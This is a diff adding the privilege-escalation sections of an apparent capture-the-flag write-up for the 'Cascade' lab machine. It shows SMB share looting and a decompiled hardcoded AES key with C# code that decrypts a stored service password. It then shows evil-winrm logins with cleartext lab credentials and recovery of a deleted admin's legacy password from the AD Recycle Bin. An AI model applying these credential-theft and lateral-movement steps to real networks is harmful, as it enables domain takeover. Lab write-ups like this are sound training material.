@@ -278,6 +278,359 @@ Info: Establishing connection to remote endpoint
 We can! Grab user.txt here :)
 
 ### Digging deeper as s.smith
+There's lots of things to check out as `s.smith` - run your usual winPEAS.exe or what not. Having done the box already, let's just say we should always begin by enumerating the user's privileges:
 ```
-TBD
+*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 8:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 8:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs                                                                                                           
+User profile                                                                                                                                             
+Home directory                                                                                                                                           
+Last logon                   1/29/2020 12:26:39 AM                                                                                                       
+                                                                                                                                                         
+Logon hours allowed          All                                                                                                                         
+                                                                                                                                                         
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
 ```
+Interesting - we see that `s.smith` is part of the `Audit Share` group, which if nothing else, is _new_. There's also a `Logon script` for `MapAuditDrive.vbs` associated with this guy, so take note of that. For now, let's go check out `Audit Share` at SMB:
+```
+$ smbclient -L cascade.htb -U s.smith%sT333ve2
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        Audit$          Disk      
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share
+```
+Great, so an `Audit$` share exists when listing shares ... actually if you recall, we've already seen this earlier. But now that we're `s.smith`, we can enter the share and check it out:
+```
+smbclient \\\\cascade.htb\\Audit$ -U s.smith%sT333ve2
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jan 29 10:01:26 2020
+  ..                                  D        0  Wed Jan 29 10:01:26 2020
+  CascAudit.exe                       A    13312  Tue Jan 28 13:46:51 2020
+  CascCrypto.dll                      A    12288  Wed Jan 29 10:00:20 2020
+  DB                                  D        0  Tue Jan 28 13:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 15:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sat Oct 26 23:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sat Oct 26 23:38:38 2019
+  x64                                 D        0  Sun Jan 26 14:25:27 2020
+  x86                                 D        0  Sun Jan 26 14:25:27 2020
+
+                13106687 blocks of size 4096. 7795037 blocks available
+```
+Right off the bat we see a few interesting files already - `CascAudit.exe` and `CascCrypto.exe` - simply because they're unusual and contain the word "crypto". Let's download them all:
+```
+$ smbget -R smb://cascade.htb/Audit$ -U s.smith%sT333ve2
+Using workgroup WORKGROUP, user s.smith
+smb://cascade.htb/Audit$/CascAudit.exe                                                                                                                   
+smb://cascade.htb/Audit$/CascCrypto.dll                                                                                                                  
+smb://cascade.htb/Audit$/DB/Audit.db                                                                                                                     
+smb://cascade.htb/Audit$/RunAudit.bat                                                                                                                    
+smb://cascade.htb/Audit$/System.Data.SQLite.dll                                                                                                          
+smb://cascade.htb/Audit$/System.Data.SQLite.EF6.dll                                                                                                      
+smb://cascade.htb/Audit$/x64/SQLite.Interop.dll                                                                                                          
+smb://cascade.htb/Audit$/x86/SQLite.Interop.dll                                                                                                          
+Downloaded 3.33MB in 52 seconds
+```
+..and look inside all the readable files...(only `RunAudit.bat` here is readable):
+```
+$ cat RunAudit.bat 
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+```
+So `CascAudit.exe` simply performs some things `Audit.db`. Great. We can see that `Audit.db` is probalby an `SQLite` file, so let's take a look inside using `SQLite`:
+```
+$ sqlite3 Audit.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> .databases
+main: /home/kali/htb/cascade/smb/s.smith.smb.audit/Audit.db
+
+sqlite> .tables
+DeletedUserAudit  Ldap              Misc  
+
+sqlite> select * from DeletedUserAudit;
+6|test|Test
+DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+7|deleted|deleted guy
+DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
+9|TempAdmin|TempAdmin
+DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
+sqlite>
+```
+Interesting! First we saw that there're three tables `DeletedUserAudit`, `Ldap`, and `Misc`. Looking inside `DeletedUserAudit` showed us the accounts that were presumably deleted during an IT audit - most notably, `TempAdmin`. We keep this knowledge and continue exploring:
+```
+sqlite> select * from Ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+```
+We find in the `Ldap` table what looks like encrypted credentials for the `ArkSvc` user. At first glance it looks like it's Base64 encoded, but try to decode it with Base64 and we see that it's actually not. Now at this stage, we can suspect that perhaps `CascAudit.exe` has something to do with the encryption, given that there was also a `CascCrypto.dll` in the `Audit` share.
+
+### Reversing CascAudit.exe and CascCrypto.dll for fun and profit
+Unfortunately, from here we have to use Windows a little (at least I did). First, we install [JetBrain's free DotPeek decompiler](https://www.jetbrains.com/decompiler/) in order to decompile `CascAudit.exe`. Once that's done, use `DotPeek` to open `CascAudit.exe` and navigate to `CascAudit` > `CascAudiot` > `MainModule` > `Main():void` like this:
+
+<insert image>
+
+Then, let's zoom in to the following code:
+```csharp
+using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", connection))
+            {
+              using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
+              {
+                sqLiteDataReader.Read();
+                empty1 = Conversions.ToString(sqLiteDataReader["Uname"]);
+                empty2 = Conversions.ToString(sqLiteDataReader["Domain"]);
+                string EncryptedString = Conversions.ToString(sqLiteDataReader["Pwd"]);
+                try
+                {
+                  str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321");
+                }
+                catch (Exception ex)
+                {
+                  ProjectData.SetProjectError(ex);
+                  Console.WriteLine("Error decrypting password: " + ex.Message);
+                  ProjectData.ClearProjectError();
+                  return;
+                }
+              }
+            }
+```
+We see that `CascAudit.exe` essentially does the following:
+- 1. Run query "`SELECT * FROM LDAP`";
+- 2. Takes out the encrypted string from the `Pwd` field which is most likely the hash `BQO5l5Kj9MdErXx6Q6AGOw==` that we'd seen earlier;
+- 3. Decrypt the encrypted string using `Crypto.DecryptString` with `c4scadek3y654321` as the key.
+  
+  
+Take a look inside `CascCrypto.dll` and see that the `DecryptString` function is defined as such:
+```csharp
+ public static string DecryptString(string EncryptedString, string Key)
+    {
+      byte[] buffer = Convert.FromBase64String(EncryptedString);
+      Aes aes = Aes.Create();
+      ((SymmetricAlgorithm) aes).KeySize = 128;
+      ((SymmetricAlgorithm) aes).BlockSize = 128;
+      ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+      ((SymmetricAlgorithm) aes).Mode = CipherMode.CBC;
+      ((SymmetricAlgorithm) aes).Key = Encoding.UTF8.GetBytes(Key);
+      using (MemoryStream memoryStream = new MemoryStream(buffer))
+      {
+        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, ((SymmetricAlgorithm) aes).CreateDecryptor(), CryptoStreamMode.Read))
+        {
+          byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
+          cryptoStream.Read(numArray, 0, numArray.Length);
+          return Encoding.UTF8.GetString(numArray);
+        }
+      }
+    }
+```
+Seems like a lot to take in, but now we've got all that we need to decrypt `ArkSvc`'s password! Let's write some makeshift `C#` code (we knew it was `C#` because the main file was called `MainModule.cs`!) to make use of the code we found! My hack attempt:
+```
+cat decrypt.cs 
+using System;
+//using CascCrypto;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+
+class HelloWorld {
+  static void Main() {
+    string str = string.Empty;
+    //Console.WriteLine("Hello World!");
+    string Pwd = "BQO5l5Kj9MdErXx6Q6AGOw==";
+    string EncryptedString = Pwd;
+    str = DecryptString(EncryptedString, "c4scadek3y654321");
+    Console.WriteLine(str);
+  }
+  public static string DecryptString(string EncryptedString, string Key)
+  {
+     byte[] buffer = Convert.FromBase64String(EncryptedString);
+     Aes aes = Aes.Create();
+     ((SymmetricAlgorithm) aes).KeySize = 128;
+     ((SymmetricAlgorithm) aes).BlockSize = 128;
+     ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+     ((SymmetricAlgorithm) aes).Mode = CipherMode.CBC;
+     ((SymmetricAlgorithm) aes).Key = Encoding.UTF8.GetBytes(Key);
+     using (MemoryStream memoryStream = new MemoryStream(buffer))
+     {
+       using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, ((SymmetricAlgorithm) aes).CreateDecryptor(), CryptoStreamMode.Read))
+       {
+         byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
+         cryptoStream.Read(numArray, 0, numArray.Length);
+         return Encoding.UTF8.GetString(numArray);
+       }
+     }
+   }
+}
+```
+My hackish attempt basically does the following:
+- 1. Copy the entire `DecryptString` function from `CascCrypto.dll` over to my script;
+- 2. Call the `DecryptString` function on the hash `BQO5l5Kj9MdErXx6Q6AGOw==` with the key `c4scadek3y654321`.
+  
+  
+Back on Kali, use `mono` to compile and run our `C#` code:
+```
+$ mcs -out:decrypt.exe decrypt.cs 
+kali@kali:~/htb/cascade/smb/test-cs$ mono decrypt.exe 
+w3lc0meFr31nd
+```
+Thank you for the welcome :)
+
+### Shell as ArkSvc
+See that the `ArkSvc` user is also part of the `Remote Management Users` group so we can login:
+```
+cat initial.txt | grep -i "remote"
+group:[Remote Desktop Users] rid:[0x22b]
+group:[WinRMRemoteWMIUsers__] rid:[0x465]
+group:[Remote Management Users] rid:[0x466]
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
+Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
+```
+Yep.
+```
+$ evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents>
+```
+As we did earlier with `s.smith`, now let's do the same thing and check out the properties of our new friend `ArkSvc`:
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 5:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 5:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/29/2020 10:05:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *AD Recycle Bin       *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+Wa-hey! This user's part of the `AD Recycle Bin` group! Which means we can access the properties of deleted AD users! Remember earlier that we had found a deleted user called `TempAdmin` - now we can inspect that user more closely.
+  
+  
+Now I must say that at this point, there is a [possibility to 'revive' a deleted user](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) since we're part of the `AD Recycle Bin` group, but we quickly see that we can't do it:
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {DisplayName -like 'TempAdmin'} -IncludeDeletedObjects | Restore-ADObject -NewName "NewAdmin"
+Insufficient access rights to perform the operation
+At line:1 char:79
++ ... Admin'} -IncludeDeletedObjects | Restore-ADObject -NewName "NewAdmin"
++                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
+    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
+```
+We have no permissions to revive `TempAdmin` into `NewAdmin` :(
+  
+  
+But no matter! As we have been doing for all the new users we've discovered on this box, let's first check out `TempAdmin`'s properties:
+```
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {DisplayName -like 'TempAdmin'} -IncludeDeletedObjects -Properties *
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+```
+Wa-hey!! Look at that! `cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz`!
+  
+  
+Turns out it's just Base64 encoded, so easily decode it...
+```
+$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
+baCT3r1aN00dles
+```
+### Shell as Administrator
+If box was trying to teach us anything, it's probably that even when IT Audits are performed regularly, bad security practices can still persist and weaken the security posture of an organization. Bad security practices like _using the same password for both TempAdmin and Administrator accounts_.
+```
+$ evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cascade\administrator
+```
+This has been a wonderful box to do, hope you enjoyed it as much as I did. :)
